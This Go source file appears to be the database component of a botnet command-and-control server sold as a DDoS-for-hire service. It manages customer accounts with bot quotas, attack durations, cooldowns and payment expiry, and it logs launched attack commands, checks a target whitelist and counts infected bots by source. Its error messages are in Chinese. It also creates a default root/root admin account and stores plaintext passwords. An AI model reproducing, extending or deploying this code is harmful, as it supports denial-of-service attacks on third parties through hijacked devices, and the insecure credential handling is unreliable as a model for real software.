package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type DBUser struct {
	Username      string `json:"username"`
	Password      string `json:"password"`
	MaxBots       int    `json:"max_bots"`
	Admin         int    `json:"admin"`
	ProxyAllowed  int    `json:"proxy_allowed"`
	DurationLimit int    `json:"duration_limit"`
	Cooldown      int    `json:"cooldown"`
	LastPaid      int64  `json:"last_paid"`
	Intvl         int    `json:"intvl"`
	ApiKey        string `json:"api_key"`
	Wrc           int    `json:"wrc"`
}

type DBHistory struct {
	UserID   int    `json:"user_id"`
	TimeSent int64  `json:"time_sent"`
	Duration int    `json:"duration"`
	Command  string `json:"command"`
	MaxBots  int    `json:"max_bots"`
}

type DBWhitelist struct {
	Prefix  string `json:"prefix"`
	Netmask int    `json:"netmask"`
}

type AccountInfo struct {
	username     string
	maxBots      int
	admin        int
	proxyAllowed int
}

type Database struct {
	mu            sync.RWMutex
	dbDir         string
	users         map[string]DBUser
	history       []DBHistory
	whitelist     []DBWhitelist
	groupSnapshots map[string]int
	lastSnapshot  time.Time
	nextUID       int
}

func NewDatabase(cfgDir string) *Database {
	dbDir := filepath.Join(cfgDir, "database")
	os.MkdirAll(dbDir, 0755)
	os.MkdirAll(filepath.Join(dbDir, "logs"), 0755)

	db := &Database{
		dbDir:          dbDir,
		users:          make(map[string]DBUser),
		history:        make([]DBHistory, 0),
		whitelist:      make([]DBWhitelist, 0),
		groupSnapshots: make(map[string]int),
		nextUID:        1,
	}

	db.loadUsers()
	db.loadHistory()
	db.loadWhitelist()
	db.loadGroupSnapshot()

	if len(db.users) == 0 {
		db.CreateUser("root", "root", -1, 0, 0, 1)
		u := db.users["root"]
		u.Admin = 1
		db.users["root"] = u
		db.saveUsers()
	}

	fmt.Println("[db] JSON database ready:", dbDir)
	return db
}

func (db *Database) loadUsers() {
	data, err := os.ReadFile(filepath.Join(db.dbDir, "users.json"))
	if err != nil {
		return
	}
	var users []DBUser
	json.Unmarshal(data, &users)
	for _, u := range users {
		db.users[u.Username] = u
		if u.Admin == 1 && len(u.Username) > 0 {
			db.nextUID = len(db.users) + 2
		}
	}
}

func (db *Database) saveUsers() {
	var list []DBUser
	for _, u := range db.users {
		list = append(list, u)
	}
	data, _ := json.MarshalIndent(list, "", "  ")
	os.WriteFile(filepath.Join(db.dbDir, "users.json"), data, 0600)
}

func (db *Database) loadHistory() {
	data, _ := os.ReadFile(filepath.Join(db.dbDir, "history.json"))
	json.Unmarshal(data, &db.history)
}

func (db *Database) saveHistory() {
	data, _ := json.MarshalIndent(db.history, "", "  ")
	os.WriteFile(filepath.Join(db.dbDir, "history.json"), data, 0600)
}

func (db *Database) loadWhitelist() {
	data, _ := os.ReadFile(filepath.Join(db.dbDir, "whitelist.json"))
	json.Unmarshal(data, &db.whitelist)
}

func (db *Database) saveWhitelist() {
	data, _ := json.MarshalIndent(db.whitelist, "", "  ")
	os.WriteFile(filepath.Join(db.dbDir, "whitelist.json"), data, 0600)
}

func (db *Database) logActivity(entryType, user, detail string) {
	entry := map[string]interface{}{
		"time":    time.Now().Unix(),
		"type":    entryType,
		"user":    user,
		"detail":  detail,
		"bots":    clientList.Count(),
	}
	data, _ := json.Marshal(entry)
	fname := filepath.Join(db.dbDir, "logs", time.Now().Format("2006-01-02")+".json")
	f, err := os.OpenFile(fname, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.Write(data)
	f.Write([]byte("\n"))
}

func (db *Database) TryLogin(username, password string) (bool, AccountInfo) {
	db.mu.RLock()
	defer db.mu.RUnlock()
	u, ok := db.users[username]
	if !ok || u.Password != password {
		return false, AccountInfo{}
	}
	if u.Wrc != 0 && u.Intvl > 0 {
		if time.Now().Unix()-u.LastPaid > int64(u.Intvl*86400) {
			return false, AccountInfo{}
		}
	}
	db.logActivity("login", username, "SSH login")
	return true, AccountInfo{username: u.Username, maxBots: u.MaxBots, admin: u.Admin, proxyAllowed: u.ProxyAllowed}
}

func (db *Database) CreateUser(username, password string, maxBots, duration, cooldown, proxyAllowed int) bool {
	db.mu.Lock()
	defer db.mu.Unlock()
	if _, exists := db.users[username]; exists {
		return false
	}
	db.users[username] = DBUser{
		Username:      username,
		Password:      password,
		MaxBots:       maxBots,
		DurationLimit: duration,
		Cooldown:      cooldown,
		ProxyAllowed:  proxyAllowed,
		LastPaid:      time.Now().Unix(),
	}
	db.saveUsers()
	db.logActivity("create_user", username, fmt.Sprintf("max_bots=%d proxy=%d", maxBots, proxyAllowed))
	return true
}

func (db *Database) RemoveUser(username string) bool {
	db.mu.Lock()
	defer db.mu.Unlock()
	if _, ok := db.users[username]; !ok {
		return false
	}
	delete(db.users, username)
	db.saveUsers()
	db.logActivity("remove_user", username, "deleted")
	return true
}

func (db *Database) ContainsWhitelistedTargets(attack *Attack) bool {
	db.mu.RLock()
	defer db.mu.RUnlock()
	for _, w := range db.whitelist {
		ip := net.ParseIP(w.Prefix)
		if ip == nil {
			continue
		}
		ip = ip.To4()
		if ip == nil {
			continue
		}
		iWhitelistPrefix := binary.BigEndian.Uint32(ip)
		for aPNetworkOrder, aN := range attack.Targets {
			rvBuf := make([]byte, 4)
			binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
			iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
			netmask := uint8(w.Netmask)
			if aN > netmask {
				if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
					return true
				}
			} else if aN < netmask {
				if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
					return true
				}
			} else {
				if iWhitelistPrefix == iAttackPrefix {
					return true
				}
			}
		}
	}
	return false
}

func (db *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	db.mu.Lock()
	defer db.mu.Unlock()

	u, ok := db.users[username]
	if !ok {
		return false, errors.New("您的访问已被终止")
	}

	if u.DurationLimit != 0 && int(duration) > u.DurationLimit {
		return false, errors.New(fmt.Sprintf("最大攻击时间为 %d 秒", u.DurationLimit))
	}

	if u.Admin == 0 {
		now := uint32(time.Now().Unix())
		for _, h := range db.history {
			if h.UserID == 0 {
				continue
			}
			hc := findUserIdx(db.users, username)
			if h.UserID == hc && uint32(h.TimeSent)+uint32(h.Duration)+uint32(u.Cooldown) > now {
				return false, errors.New(fmt.Sprintf("请等待 %d 秒", (uint32(h.TimeSent)+uint32(h.Duration)+uint32(u.Cooldown))-now))
			}
		}
	}

	db.history = append(db.history, DBHistory{
		UserID:   findUserIdx(db.users, username),
		TimeSent: time.Now().Unix(),
		Duration: int(duration),
		Command:  fullCommand,
		MaxBots:  maxBots,
	})
	db.saveHistory()
	db.logActivity("attack", username, fmt.Sprintf("%s bots=%d", fullCommand, maxBots))
	return true, nil
}

func findUserIdx(users map[string]DBUser, username string) int {
	i := 1
	for n := range users {
		if n == username {
			return i
		}
		i++
	}
	return 0
}

func (db *Database) GetUserByAPIKey(username, apiKey string) (*AccountInfo, error) {
	db.mu.RLock()
	defer db.mu.RUnlock()
	u, ok := db.users[username]
	if !ok || u.ApiKey != apiKey {
		return nil, nil
	}
	return &AccountInfo{username: u.Username, maxBots: u.MaxBots, admin: u.Admin, proxyAllowed: u.ProxyAllowed}, nil
}

func (db *Database) GenerateAPIKey(username string) (string, error) {
	db.mu.Lock()
	defer db.mu.Unlock()
	u, ok := db.users[username]
	if !ok {
		return "", errors.New("user not found")
	}
	keyBytes := make([]byte, 32)
	rand.Read(keyBytes)
	u.ApiKey = hex.EncodeToString(keyBytes)
	db.users[username] = u
	db.saveUsers()
	return u.ApiKey, nil
}

func (db *Database) SetProxyAllowed(username string, allowed int) bool {
	db.mu.Lock()
	defer db.mu.Unlock()
	u, ok := db.users[username]
	if !ok {
		return false
	}
	u.ProxyAllowed = allowed
	db.users[username] = u
	db.saveUsers()
	db.logActivity("proxy", username, fmt.Sprintf("set proxy=%d", allowed))
	return true
}

func (db *Database) GetProxyAllowed(username string) int {
	db.mu.RLock()
	defer db.mu.RUnlock()
	u, ok := db.users[username]
	if !ok {
		return 0
	}
	return u.ProxyAllowed
}

func (db *Database) ListProxyUsers() []AccountInfo {
	db.mu.RLock()
	defer db.mu.RUnlock()
	var list []AccountInfo
	for _, u := range db.users {
		if u.ProxyAllowed == 1 {
			list = append(list, AccountInfo{username: u.Username, maxBots: u.MaxBots, admin: u.Admin, proxyAllowed: u.ProxyAllowed})
		}
	}
	return list
}

func (db *Database) GetAPIKey(username string) string {
	db.mu.RLock()
	defer db.mu.RUnlock()
	u, ok := db.users[username]
	if !ok {
		return ""
	}
	return u.ApiKey
}

func (db *Database) GetGroupHistory() map[string]int {
	db.mu.RLock()
	defer db.mu.RUnlock()
	result := make(map[string]int)
	for k, v := range db.groupSnapshots {
		result[k] = v
	}
	return result
}

func (db *Database) SnapshotGroups() {
	db.mu.Lock()
	defer db.mu.Unlock()
	if time.Since(db.lastSnapshot) < 1*time.Hour {
		return
	}
	db.groupSnapshots = make(map[string]int)
	for _, b := range clientList.clients {
		src := b.source
		if src == "" { src = "default" }
		db.groupSnapshots[src]++
	}
	db.lastSnapshot = time.Now()
	db.saveGroupSnapshot()
}

func (db *Database) loadGroupSnapshot() {
	data, _ := os.ReadFile(filepath.Join(db.dbDir, "group_snapshot.json"))
	var s map[string]int
	if json.Unmarshal(data, &s) == nil {
		db.groupSnapshots = s
		db.lastSnapshot = time.Now()
	}
}

func (db *Database) saveGroupSnapshot() {
	data, _ := json.MarshalIndent(db.groupSnapshots, "", "  ")
	os.WriteFile(filepath.Join(db.dbDir, "group_snapshot.json"), data, 0600)
}

func (db *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
	db.mu.RLock()
	defer db.mu.RUnlock()
	for _, u := range db.users {
		if u.ApiKey == apikey {
			return true, AccountInfo{username: u.Username, maxBots: u.MaxBots, admin: u.Admin, proxyAllowed: u.ProxyAllowed}
		}
	}
	return false, AccountInfo{}
}
